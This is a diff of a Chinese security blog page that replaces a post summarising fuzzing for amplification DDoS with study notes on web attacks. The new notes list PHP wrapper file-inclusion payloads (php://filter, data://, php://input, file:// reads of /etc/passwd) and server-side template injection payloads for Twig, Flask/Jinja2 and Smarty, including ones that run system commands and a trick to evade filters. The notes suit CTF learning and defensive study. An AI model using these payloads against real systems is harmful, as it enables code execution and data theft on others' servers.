@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   
-  <title>我的技术与生活——Paper 4 | Dimples的Blog</title>
+  <title>我的技术与生活——S3 | Dimples的Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
   <link rel="stylesheet" href="/css/public.css" />
@@ -16,7 +16,7 @@
 
   <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
   <script>
-    document.title = `我的技术与生活——Paper 4`
+    document.title = `我的技术与生活——S3`
   </script>
 <meta name="generator" content="Hexo 6.3.0"></head>
 
@@ -371,7 +371,7 @@ pre:active {
 
 <div class="article-container">
   <div class="article">
-    <h1 class="article-title">Paper 4</h1>
+    <h1 class="article-title">S3</h1>
     <div class="article-info">
       <div class="article-info--item">
         <div class="article-info--info">
@@ -387,23 +387,114 @@ pre:active {
             
           </div>
           
-          <p class="article-info--date">日期：2024-01-30 20:34:21</p>
+          <p class="article-info--date">日期：2024-02-05 20:44:29</p>
         </div>
         <img src="/imgs/default-cover.webp" alt="" class="article-cover">
       </div>
     </div>
     <article class="article-content">
-      <h4 id="提出问题"><a href="#提出问题" class="headerlink" title="提出问题"></a>提出问题</h4><p>​	<strong>放大DDoS攻击</strong>仍然是对互联网的普遍和严重威胁，最近的攻击达到了Tbps的范围。然而，迄今为止已知的所有放大攻击媒介要么是由研究人员通过艰苦的人工分析发现的，要么只能在大规模攻击后进行事后识别。但是，理想情况下，在第一次攻击发生之前，可以发现并缓解攻击。</p>
-<p>放大DDos攻击：放大攻击是分布式拒绝服务(DDoS)攻击的主要类型，它是发送带有虚假源地址的数据包给中间媒介，中间媒介对于每个来自攻击者的原始数据包会产生多个响应数据包。攻击者可以使用一个伪造的源IP地址发送一个小数据包（伪造的IP地址就是受害者的IP地址），并让服务器(或多个服务器)向受害者发送大量回复，从而导致受害者网络拥塞。</p>
-<h4 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h4><p>​	模糊测试（Fuzzing）已经成为一种发现软件漏洞的流行技术。起源于软件测试领域，其关键思想是在大量随机输入下运行被测系统(System under Test, SuT)，同时监视其异常行为。虽然通常用于检查崩溃，但模糊测试也被用于发现性能问题或意外的大内存分配</p>
-<h4 id="灰盒模糊器"><a href="#灰盒模糊器" class="headerlink" title="灰盒模糊器"></a>灰盒模糊器</h4><p>​	黑盒模糊器完全随机地生成输入，对SuT的内部工作原理一无所知。这使他们能够快速测试许多输入，但通常会在需要结构化输入的程序中失败。相反，白盒模糊器试图通过静态程序分析来深入了解SuT，这可能需要象征性地执行程序来查找当前路径的输入约束。这使得白盒模糊测试可以到达代码的“深层”部分。然而，符号执行的沉重运行时开销，加上路径爆炸问题和库支持不足，使得白盒模糊测试在许多用例中不切实际。</p>
-<p>​	因此，最常用的方法是灰盒模糊，针对上述策略之间的最佳点。灰盒模糊测试通过轻量级程序检测获得的运行时反馈增强了黑盒模糊测试的可扩展性。然后，这个运行时反馈用于指导输入生成，要么增加一般代码覆盖率，要么达到程序中的特定点。</p>
+      <h4 id="1-PHP伪协议"><a href="#1-PHP伪协议" class="headerlink" title="1.PHP伪协议"></a>1.PHP伪协议</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/120695429?ops_request_misc=%7B%22request_id%22:%22169441590016800184166096%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=169441590016800184166096&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-120695429-null-null.142%5Ev93%5EchatgptT3_2&utm_term=php%E4%BC%AA%E5%8D%8F%E8%AE%AE&spm=1018.2226.3001.4187">PHP伪协议详解_Snakin_ya的博客-CSDN博客</a></p>
+<pre class="line-numbers language-none"><code class="language-none">1 file:&#x2F;&#x2F; — 访问本地文件系统
+2 http:&#x2F;&#x2F; — 访问 HTTP(s) 网址
+3 ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs
+4 php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）
+5 zlib:&#x2F;&#x2F; — 压缩流
+6 data:&#x2F;&#x2F; — 数据（RFC 2397）
+7 glob:&#x2F;&#x2F; — 查找匹配的文件路径模式
+8 phar:&#x2F;&#x2F; — PHP 归档
+9 ssh2:&#x2F;&#x2F; — Secure Shell 2
+10 rar:&#x2F;&#x2F; — RAR
+11 ogg:&#x2F;&#x2F; — 音频流
+12 expect:&#x2F;&#x2F; — 处理交互式的流<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>常用：</p>
+<p><strong>一.php:&#x2F;&#x2F;filter:php</strong>:可以获取指定文件源码。当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。</p>
+<pre class="line-numbers language-none"><code class="language-none">1.php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php
+
+2.php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;index.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>二.data:&#x2F;&#x2F;</strong>:数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。</p>
+<pre class="line-numbers language-none"><code class="language-none">1.data:&#x2F;&#x2F;text&#x2F;plain,
+http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php%20phpinfo();?&gt;
+
+2.data:&#x2F;&#x2F;text&#x2F;plain;base64,
+http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>三.file:&#x2F;&#x2F;</strong>:用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响。file:&#x2F;&#x2F;协议主要用于访问文件(绝对路径、相对路径以及网络路径)</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.xx.com?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passswor<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><strong>四.php:&#x2F;&#x2F;input</strong>:可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;cmd.php?cmd&#x3D;php:&#x2F;&#x2F;input
+POST数据：&lt;?php phpinfo()?&gt;
+
+注意：
+当enctype&#x3D;&quot;multipart&#x2F;form-data&quot;的时候 php:&#x2F;&#x2F;input&#96; 是无效的
+
+遇到file_get_contents()要想到用php:&#x2F;&#x2F;input绕过。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://cloud-imags.oss-cn-beijing.aliyuncs.com/C:%5CUsers%5C27783%5CAppData%5CLocal%5CPrograms%5CPicGov2-3180154f111f9da42b71bb9b949b446a_r.jpg" alt="img"></p>
+<h4 id="2-服务器端模板注入（SSTI）"><a href="#2-服务器端模板注入（SSTI）" class="headerlink" title="2.服务器端模板注入（SSTI）"></a>2.服务器端模板注入（SSTI）</h4><p><img src="https://cloud-imags.oss-cn-beijing.aliyuncs.com/C:%5CUsers%5C27783%5CAppData%5CLocal%5CPrograms%5CPicGoimage-20230913155816734.png" alt="image-20230913155816734"></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/246832.html">细说服务器端模板注入（SSTI） - FreeBuf网络安全行业门户</a></p>
+<h5 id="Twig注入payload："><a href="#Twig注入payload：" class="headerlink" title="Twig注入payload："></a><strong>Twig注入payload</strong>：</h5><pre class="line-numbers language-none"><code class="language-none">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat &#x2F;flag&quot;)&#125;&#125;&#x2F;&#x2F;查看flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h5 id="Flask注入payload"><a href="#Flask注入payload" class="headerlink" title="Flask注入payload"></a><strong>Flask注入payload</strong></h5><pre class="line-numbers language-none"><code class="language-none">url_for() 方法:
+
+url_for() 会返回视图函数对应的URL。如果定义的视图函数是带有参数的，则可以将这些参数作为命名参数传入。
+
+get_flashed_messages() 方法：
+
+返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">&#123;&#123;url_for.__globals__&#125;&#125;查看全部的变量信息 
+
+&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;查看当前的配置变量<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_51428325/article/details/121357005">Python-模板注入_render_template_string_jinqipiaopiao的博客-CSDN博客</a></p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment">#查看可用函数</span>
+
+<span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__
+<span class="token operator">&lt;</span>slot wrapper <span class="token string">'__init__'</span> of <span class="token string">'object'</span> objects<span class="token operator">></span>
+<span class="token comment"># wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性</span>
+
+<span class="token comment">#再换几个子类，很快就能找到一个重载过__init__的类，比如</span>
+<span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__
+
+<span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span>
+<span class="token comment">#然后用eval执行命令即可</span>
+
+若例如<span class="token builtin">globals</span>被过滤，可使用字符串拼接
+将<span class="token punctuation">.</span>__globals__替换为<span class="token punctuation">[</span><span class="token string">'__glo'</span><span class="token operator">+</span><span class="token string">'bals__'</span><span class="token punctuation">]</span>
+<span class="token punctuation">.</span>__globals__等同于<span class="token punctuation">[</span><span class="token string">'__globals__'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">71</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'命令'</span><span class="token punctuation">)</span>
+
+<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">[</span><span class="token string">'__glo'</span><span class="token operator">+</span><span class="token string">'bals__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('命令').read()"</span><span class="token punctuation">)</span> <span class="token operator">//</span>不含os
+
+<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">71</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">[</span><span class="token string">'__glo'</span><span class="token operator">+</span><span class="token string">'bals__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'命令'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">//</span>内含os
+<span class="token comment">#执行命令</span>
+
+<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">71</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token comment">#读取当前目录</span>
+
+<span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'文件名'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>　　　　<span class="token comment">#把 read() 改为 write() 就是写文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hackxf/p/10480071.html">python-flask-ssti(模版注入漏洞) - 晓枫v5 - 博客园 (cnblogs.com)</a></p>
+<h5 id="Smarty注入payload"><a href="#Smarty注入payload" class="headerlink" title="Smarty注入payload"></a><strong>Smarty注入payload</strong></h5><pre class="line-numbers language-none"><code class="language-none">&#123;command&#125;
+
+&#123;if command)&#125;&#123;&#x2F;if&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 
     </article>
     
     <div class="read-nums">
       <!-- id 将作为查询条件 -->
-      <span id="2024/01/30/4/" class="leancloud_visitors" data-flag-title="Your Article Title">
+      <span id="2024/02/05/8/" class="leancloud_visitors" data-flag-title="Your Article Title">
         <em class="post-meta-item-text">浏览量</em>
         <i class="leancloud-visitors-count"></i>
       </span>
@@ -419,20 +510,15 @@ pre:active {
     <div class="article-catelogue--wrapper">
       <div class="catelogue catelogue-1">
         <h3>目录</h3>
-        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E5%87%BA%E9%97%AE%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">提出问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fuzzing"><span class="toc-number">2.</span> <span class="toc-text">Fuzzing</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%81%B0%E7%9B%92%E6%A8%A1%E7%B3%8A%E5%99%A8"><span class="toc-number">3.</span> <span class="toc-text">灰盒模糊器</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.</span> <span class="toc-text">1.PHP伪协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88SSTI%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">2.服务器端模板注入（SSTI）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Twig%E6%B3%A8%E5%85%A5payload%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">Twig注入payload：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Flask%E6%B3%A8%E5%85%A5payload"><span class="toc-number">2.2.</span> <span class="toc-text">Flask注入payload</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Smarty%E6%B3%A8%E5%85%A5payload"><span class="toc-number">2.3.</span> <span class="toc-text">Smarty注入payload</span></a></li></ol></li></ol>
       </div>
       
         <div class="catelogue catelogue-2">
-          
-            <p>
-              <span>上一篇：</span>
-              <a href="/2024/01/31/4-2/">Paper 4-2</a>
-            </p>
            
           
             <p>
               <span>下一篇</span>
-              <a href="/2024/01/28/3/">Paper 3</a>
+              <a href="/2024/02/04/7/">S2</a>
             </p>
           
         </div>
@@ -455,7 +541,7 @@ pre:active {
     recordIP: config.recordIP,
     visitor: config.visitor,
     enableQQ: config.enableQQ,
-    path: '2024/01/30/4/'
+    path: '2024/02/05/8/'
   })
 </script>
 
